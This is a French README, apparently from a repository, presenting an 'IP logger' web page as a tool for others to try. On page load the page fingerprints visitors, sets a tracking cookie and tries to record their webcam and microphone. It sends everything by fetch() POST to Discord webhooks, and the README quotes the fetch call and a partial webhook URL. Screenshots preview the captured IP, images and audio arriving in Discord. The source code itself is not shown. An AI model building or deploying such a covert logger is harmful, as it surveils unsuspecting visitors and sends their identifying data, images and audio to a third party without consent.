# IP Looger Webhook discord

## 1. Initialisation et Cookies
Le script se déclenche au chargement de la page (`<body onload="sendAuto()">`). Il tente de créer une persistance via un cookie "userId" pour identifier le navigateur lors de visites futures.

## 2. Capture de l'environnement
Le script compile des données techniques (User Agent, IP via `api.ipify.org`, WebGL) pour créer une empreinte numérique de la machine cible.

## 3. Mécanisme de Transmission (Fonction `sendAuto`)
La fonction `sendAuto()` est le cœur du script. Elle utilise l'API standard `fetch()` pour envoyer les données collectées.

### Analyse de la syntaxe `fetch`
Dans ce code, la méthode d'envoi suit la structure suivante :
`await fetch("URL_DE_DESTINATION", { method: "POST", ... })`

Le code contient trois appels distincts à cette fonction, chacun ciblant une adresse spécifique définie dans le premier argument (entre guillemets) :

1.  **Envoi des Infos (JSON)** :
    * Le code contient une chaîne de caractères générique (`"webhook_discord_here"`) à la place d'une URL valide. C'est ici que la requête POST contenant l'IP et les infos système est dirigée.
2.  **Envoi de la Webcam (Multipart)** :
    * Le code contient une URL complète vers Discord (`https://discord.com/api/webhooks/...`). Cela indique que les images capturées seraient envoyées vers cette adresse spécifique déjà présente dans le code.
3.  **Envoi de l'Audio (Multipart)** :
    * Le code utilise une autre chaîne générique (`"Webhook_discord_here"`) comme destination pour le fichier audio `.webm`.

## 4. Vulnérabilité de Sécurité (Client-Side)
D'un point de vue architectural, définir ces destinations directement dans le code JavaScript (côté client) est une faille de sécurité critique :
* **Exposition totale :** Toute personne inspectant le code source de la page (Ctrl+U) peut lire l'URL de destination.
* **Conséquence :** Si un Webhook Discord valide est placé à ces endroits, il est public. N'importe qui peut le récupérer pour le supprimer ou l'utiliser pour envoyer du contenu malveillant sur le serveur associé.

## 5. Capture Multimédia
Les fonctions `captureWebcam` et `captureAudio` tentent d'accéder aux périphériques matériels.
* *Note technique :* Sur les navigateurs modernes (Chrome, Firefox, Safari), ces fonctions échoueront systématiquement si elles sont lancées automatiquement au chargement, car les politiques de sécurité exigent une interaction utilisateur préalable (clic).

## 6. Voici l'interface du site

![interface du site](https://media.discordapp.net/attachments/1436987950092128306/1455630301568172208/image.png?ex=69556cdc&is=69541b5c&hm=2d0d350ef1fefd00fc572f37ab6ab992d77cf122e70c2fc30203dd800b0f9d26&=&format=webp&quality=lossless&width=1526&height=714)

## 7. Voici des preview du Webhook

Infromations

![info](https://cdn.discordapp.com/attachments/1454106645293695071/1455652988906508458/image.png?ex=695581fd&is=6954307d&hm=ec4dd9db35cf4942b0b0ca7066317b6d899177ab48a4f0ce89f9a1523eaa6199)

Webcam

![Cam](https://media.discordapp.net/attachments/1454106645293695071/1455660236584255631/image.png?ex=695588bd&is=6954373d&hm=ddc36fac3aae7e670a26d815d9738fdb962af9a43b830dd95f9249ebd29601bc&=&format=webp&quality=lossless&width=864&height=626)

Audio

![Audio](https://media.discordapp.net/attachments/1454106645293695071/1455660245178384526/image.png?ex=695588bf&is=6954373f&hm=6e2efce3426e84986bd61885b67ac3fa1dc8471c0d2655a60a156eb88d478e2e&=&format=webp&quality=lossless&width=803&height=414)

Merci de tester <3
